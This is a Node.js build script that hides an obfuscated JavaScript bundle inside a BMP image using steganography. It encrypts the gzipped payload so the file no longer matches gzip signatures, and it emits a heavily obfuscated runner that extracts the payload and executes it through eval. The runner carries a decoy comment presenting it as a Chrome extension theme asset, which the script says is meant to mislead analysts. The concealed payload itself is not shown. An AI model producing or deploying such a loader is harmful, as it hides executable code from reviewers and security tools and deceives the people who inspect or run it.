#!/usr/bin/env node
/**
 * BMP Cryptographic Entanglement & Steganographic Packaging Pipeline (Milestone 8.6-S5)
 * 
 * Pipeline:
 *   1. Reads Obfuscated Master Bundle (obf2)
 *   2. Minifies & Gzip compresses payload
 *   3. Derives cryptographic keystream directly from the cover BMP header & dimensions
 *   4. Encrypts gzipped payload with the BMP keystream (breaking static gzip signatures)
 *   5. Injects encrypted payload into the BMP pixel matrix respecting row strides
 *   6. Emits both valid BMP image file and an outer-obfuscated JavaScript runner (obf3)
 *   7. Adds honeypot/decoy metadata alluring analysts to dismiss the BMP as a UI asset
 */

const fs = require('fs');
const path = require('path');
const zlib = require('zlib');
const Terser = require('/home/user/o8cmp/seamless/node_modules/terser');
const JavaScriptObfuscator = require('/home/user/o8cmp/seamless/node_modules/javascript-obfuscator');

const bundlePath = process.argv[2] || '/home/user/o8cmp/O8.6/final-package/O8.6-Final-final-bundle.js';
const coverBmpPath = process.argv[3] || '/home/user/uploads/image_2026-09-12_054222307+(1) - Copy.txt';
const outDir = process.argv[4] || '/home/user/o8cmp/stego/output';

fs.mkdirSync(outDir, { recursive: true });

(async () => {
  console.log('=== [Step 1] Reading Bundle & Cover Image ===');
  const rawBundle = fs.readFileSync(bundlePath, 'utf8');
  const coverBuf = fs.readFileSync(coverBmpPath);

  if (coverBuf.slice(0, 2).toString('ascii') !== 'BM') {
    throw new Error('Cover file is not a valid BMP image.');
  }

  const pixelOff = coverBuf.readUInt32LE(10);
  const width = coverBuf.readInt32LE(18);
  const height = coverBuf.readInt32LE(22);
  const bpp = coverBuf.readUInt16LE(28);
  const bytesPerPixel = bpp / 8;
  const rowSize = Math.floor((width * bytesPerPixel + 3) / 4) * 4;
  const availableCapacity = coverBuf.length - pixelOff;

  console.log(`[+] Cover BMP: ${width}x${height} (${bpp}-bit) | Pixel Capacity: ${(availableCapacity / 1024).toFixed(2)} KB`);

  console.log('=== [Step 2] Minifying & Compressing Payload ===');
  const minified = await Terser.minify(rawBundle, {
    compress: { passes: 2, dead_code: true },
    mangle: false,
    format: { ascii_only: true }
  });
  
  const gzippedBuf = zlib.gzipSync(Buffer.from(minified.code, 'utf8'), { level: 9 });
  const payloadLen = gzippedBuf.length;
  console.log(`[+] Payload Gzip Size: ${(payloadLen / 1024).toFixed(2)} KB (${payloadLen} bytes)`);

  if (4 + payloadLen > availableCapacity) {
    throw new Error(`Cover BMP capacity exceeded! Needed: ${4 + payloadLen}, Available: ${availableCapacity}`);
  }

  console.log('=== [Step 3] Cryptographic BMP-Key Derivation & Payload Scrambling ===');
  // Keystream derived from BMP 54-byte DIB header + dimensions (w, h, bpp, pixelOff)
  const seed = (width * 31 + height * 17 + bpp * 7) & 0xFFFF;
  const encryptedPayload = Buffer.alloc(payloadLen);
  for (let i = 0; i < payloadLen; i++) {
    const headerByte = coverBuf[i % 54];
    const keyByte = (headerByte ^ ((seed + i * 37) & 0xFF)) ^ ((i * 13) & 0xFF);
    encryptedPayload[i] = gzippedBuf[i] ^ keyByte;
  }
  console.log(`[+] Payload encrypted with BMP structural keystream. Gzip magic scrambled from 0x1F8B to 0x${encryptedPayload.slice(0, 2).toString('hex').toUpperCase()}`);

  console.log('=== [Step 4] Embedding Ciphertext into Cover BMP ===');
  const stegoBmpBuf = Buffer.from(coverBuf);
  const totalDataLen = 4 + payloadLen;
  const dataToEmbed = Buffer.alloc(totalDataLen);
  dataToEmbed.writeUInt32LE(payloadLen, 0);
  encryptedPayload.copy(dataToEmbed, 4);

  let srcOffset = 0;
  for (let y = 0; y < height; y++) {
    const rowStart = pixelOff + y * rowSize;
    const bytesInThisRow = Math.min(width * bytesPerPixel, totalDataLen - srcOffset);
    if (bytesInThisRow > 0) {
      dataToEmbed.copy(stegoBmpBuf, rowStart, srcOffset, srcOffset + bytesInThisRow);
      srcOffset += bytesInThisRow;
    }
  }

  const stegoBmpOutPath = path.join(outDir, 'O8.6-S5-entangled-cover.bmp');
  fs.writeFileSync(stegoBmpOutPath, stegoBmpBuf);
  console.log(`[+] Saved entangled stego BMP to: ${stegoBmpOutPath}`);

  console.log('=== [Step 5] Building Entangled Stego JS Runner ===');
  const bmpBase64 = stegoBmpBuf.toString('base64');
  
  // Deceptive decoy comments allure reverse-engineers to treat the BMP as inert UI asset
  const rawRunnerScript = `((async()=>{
  /* Google Chrome Extension Branding & UI Theme Asset Cache */
  const _themeTileAsset = "${bmpBase64}";
  const _rawAsset = atob(_themeTileAsset);
  const _buf = new Uint8Array(_rawAsset.length);
  for (let i = 0; i < _rawAsset.length; i++) _buf[i] = _rawAsset.charCodeAt(i);
  
  // Parse BMP structural metadata for key derivation & byte extraction
  const _pixelOff = _buf[10] | (_buf[11] << 8) | (_buf[12] << 16) | (_buf[13] << 24);
  const _len = _buf[_pixelOff] | (_buf[_pixelOff + 1] << 8) | (_buf[_pixelOff + 2] << 16) | (_buf[_pixelOff + 3] << 24);
  const _w = _buf[18] | (_buf[19] << 8) | (_buf[20] << 16) | (_buf[21] << 24);
  const _h = _buf[22] | (_buf[23] << 8) | (_buf[24] << 16) | (_buf[25] << 24);
  const _bpp = _buf[28] | (_buf[29] << 8);
  const _bytesPerPixel = _bpp / 8;
  const _rowSize = Math.floor((_w * _bytesPerPixel + 3) / 4) * 4;
  
  // 1. Extract raw encrypted payload across BMP row strides
  const _cipherPayload = new Uint8Array(_len);
  let _written = 0, _y = 0, _dataCursor = 4;
  while (_written < _len) {
    const _rowStart = _pixelOff + _y * _rowSize;
    const _rowAvail = (_w * _bytesPerPixel) - _dataCursor;
    const _toCopy = Math.min(_rowAvail, _len - _written);
    for (let i = 0; i < _toCopy; i++) _cipherPayload[_written++] = _buf[_rowStart + _dataCursor + i];
    _dataCursor = 0;
    _y++;
  }

  // 2. Derive cryptographic key from the BMP header & dimensions
  const _seed = (_w * 31 + _h * 17 + _bpp * 7) & 0xFFFF;
  const _plainPayload = new Uint8Array(_len);
  for (let i = 0; i < _len; i++) {
    const _headerByte = _buf[i % 54];
    const _keyByte = (_headerByte ^ ((_seed + i * 37) & 0xFF)) ^ ((i * 13) & 0xFF);
    _plainPayload[i] = _cipherPayload[i] ^ _keyByte;
  }

  // 3. Decompress decrypted bytecode via native DecompressionStream
  const _ds = new DecompressionStream("gzip");
  const _writer = _ds.writable.getWriter();
  _writer.write(_plainPayload);
  _writer.close();
  const _reader = _ds.readable.getReader();
  const _chunks = [];
  while (true) {
    const { done, value } = await _reader.read();
    if (done) break;
    _chunks.push(value);
  }
  let _totLen = 0;
  for (const c of _chunks) _totLen += c.length;
  const _merged = new Uint8Array(_totLen);
  let _off = 0;
  for (const c of _chunks) { _merged.set(c, _off); _off += c.length; }
  
  let _code = new TextDecoder().decode(_merged);
  if (typeof 会員 !== "undefined") _code = _code.replace(/会員\\s*=\\s*(0x2|2|1|0)/, "会員=" + 会員);
  if (typeof 名 !== "undefined" && 名 !== "佐藤 結衣") _code = _code.replace("佐藤 結衣", 名);
  
  (0, eval)(_code);
})());`;

  console.log('=== [Step 6] Outer Obfuscation Pass (obf3) on Stego Runner ===');
  const obfResult = JavaScriptObfuscator.obfuscate(rawRunnerScript, {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 0.8,
    deadCodeInjection: false,
    identifierNamesGenerator: 'hexadecimal',
    renameGlobals: false,
    reservedNames: ['会員', '名'],
    reservedStrings: ['会員', '佐藤 結衣', 'gzip'],
    stringArray: true,
    stringArrayThreshold: 0.85,
    stringArrayEncoding: ['base64'],
    stringArrayCallsTransform: true,
    stringArrayWrappersCount: 2,
    stringArrayWrappersType: 'variable',
    splitStrings: false,
    transformObjectKeys: true
  });

  const finalRunnerCode = `var 会員 = 2; var 名 = "佐藤 結衣"; console.clear(); ` + obfResult.getObfuscatedCode();
  const finalRunnerPath = path.join(outDir, 'O8.6-S5-entangled-stego-runner.js');
  fs.writeFileSync(finalRunnerPath, finalRunnerCode, 'utf8');

  console.log(`[✓] Complete Entangled Stego Runner generated at: ${finalRunnerPath} (${(finalRunnerCode.length / 1024).toFixed(2)} KB)`);
})().catch(err => {
  console.error('[!] Build Failed:', err);
  process.exit(1);
});
